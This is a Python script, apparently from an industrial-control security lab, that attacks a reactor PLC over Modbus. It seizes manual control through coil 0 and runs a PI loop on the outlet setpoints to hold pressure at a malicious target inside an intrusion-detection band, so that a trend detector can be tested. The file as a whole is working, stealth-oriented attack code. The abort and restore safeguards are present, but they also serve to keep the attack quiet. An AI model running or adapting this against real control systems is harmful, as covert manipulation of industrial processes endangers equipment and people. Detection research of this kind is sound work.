#!/usr/bin/env python3
"""Subtle sustained pressure bias -- HELD INSIDE the normal band.

Attacker takes manual control (Modbus coil 0), VERIFIES the coil read-back is True,
then runs a slow regulator that holds reactor pressure at a malicious target a few
kPa above normal but still INSIDE the IDS static band [~2693, 2702] (+/- tol ~2709).
Purpose: test whether the trend (CUSUM) layer catches a bias the static band cannot.

  python3 subtle_hold.py                      # target 2704 kPa, 300 s (PI defaults)
  python3 subtle_hold.py 2698 60              # dry run: hold ~current normal 60 s
  python3 subtle_hold.py 2704 300 500 130 30 # target hold Kp Ki u0%  (tuning knobs)

PI control: outlet = u0 + Kp*(p-target) + Ki*integral(p-target). The integral term
finds the exact feed/outlet balance that holds pressure at target, eliminating the
steady-state offset pure-proportional control leaves on an integrating plant.

Undo with back_to_auto.py (sets coil 0 False). Hard-aborts + restores auto if pressure
leaves the safe envelope, so it cannot degrade into the loud runaway attack.
"""
import time, sys
from pymodbus.client import ModbusTcpClient

PLC   = "192.168.95.2"
TARGET = float(sys.argv[1]) if len(sys.argv) > 1 else 2704.0
HOLD_S = float(sys.argv[2]) if len(sys.argv) > 2 else 300.0
KP     = float(sys.argv[3]) if len(sys.argv) > 3 else 500.0    # counts per kPa (proportional)
KI     = float(sys.argv[4]) if len(sys.argv) > 4 else 130.0    # counts per kPa-second (integral)
U0_PCT = float(sys.argv[5]) if len(sys.argv) > 5 else 30.0     # starting outlet %, near feed/outlet balance
DT     = 1.0         # control period (s) -- fast enough for a ~2 kPa/s integrator
I_CLAMP = 28000      # anti-windup: clamp the integral contribution (counts)
WARN_HI, WARN_LO = 2708.0, 2692.0   # inside band+tol -> just warn
ABORT_HI, ABORT_LO = 2713.0, 2686.0 # leaving the envelope -> abort + restore

c = ModbusTcpClient(PLC, port=502, timeout=3)
if not c.connect():
    sys.exit(f"cannot reach {PLC}:502 (firewall?)")

def pressure():
    ir = c.read_input_registers(100, count=10, slave=1).registers
    return ir[8] * 3200 / 65535

def restore():
    try:
        c.write_coil(0, False, slave=1)
        rb = c.read_coils(0, count=1, slave=1).bits[0]
        print(f"restore: coil0 (manual_mode) now = {rb}  (False = auto control back)")
    except Exception as e:
        print("restore failed:", e, "-- run back_to_auto.py manually!")

p0 = pressure()
print(f"baseline pressure {p0:.1f} kPa | target {TARGET:.0f} | band ~2693-2702 (+tol ~2709)")

# --- engage manual mode and VERIFY (the step that was never confirmed before) ---
c.write_coil(0, True, slave=1)
rb = c.read_coils(0, count=1, slave=1).bits[0]
print(f"coil0 (manual_mode) read-back = {rb}")
if rb is not True:
    print("MANUAL MODE NOT CONFIRMED -- aborting, nothing held.")
    c.close(); sys.exit(1)

# feeds at normal (f1=100%, f2=0); outlets start near the feed/outlet balance point
U0 = int(U0_PCT / 100 * 65535)
c.write_registers(10, [65535, 0, U0, U0], slave=1)
outlet = U0; I = 0.0
print(f"manual CONFIRMED. PI-regulating outlets to hold {TARGET:.0f} kPa for {HOLD_S:.0f}s "
      f"(Kp={KP} Ki={KI} u0={U0_PCT:.0f}%)")
print("(Ctrl+C aborts and restores auto)\n")

t0 = time.time(); lo = hi = p0; n_in_band = n = 0
try:
    while time.time() - t0 < HOLD_S:
        p = pressure(); lo = min(lo, p); hi = max(hi, p); n += 1
        if 2693 - 7.4 <= p <= 2702 + 7.4:
            n_in_band += 1
        if p > ABORT_HI or p < ABORT_LO:
            print(f"!! pressure {p:.1f} left safe envelope -- ABORTING to stay subtle")
            break
        e = p - TARGET                        # p>target -> raise outlet -> pressure falls
        I += e * DT
        Icontrib = max(-I_CLAMP, min(I_CLAMP, KI * I))
        outlet = int(max(0, min(65535, U0 + KP * e + Icontrib)))
        c.write_registers(12, [outlet, outlet], slave=1)   # purge_sp, product_sp
        flag = "  <-- warn" if (p > WARN_HI or p < WARN_LO) else ""
        print(time.strftime("%H:%M:%S"),
              f"p={p:7.1f}  outlet={outlet*100/65535:4.0f}%  e={e:+5.1f}  I={Icontrib:+7.0f}{flag}")
        time.sleep(DT)
except KeyboardInterrupt:
    print("\naborted by user")
finally:
    print(f"\nhold done: pressure {lo:.1f}..{hi:.1f} kPa | "
          f"{n_in_band}/{n} samples stayed inside the static band")
    restore()
    c.close()
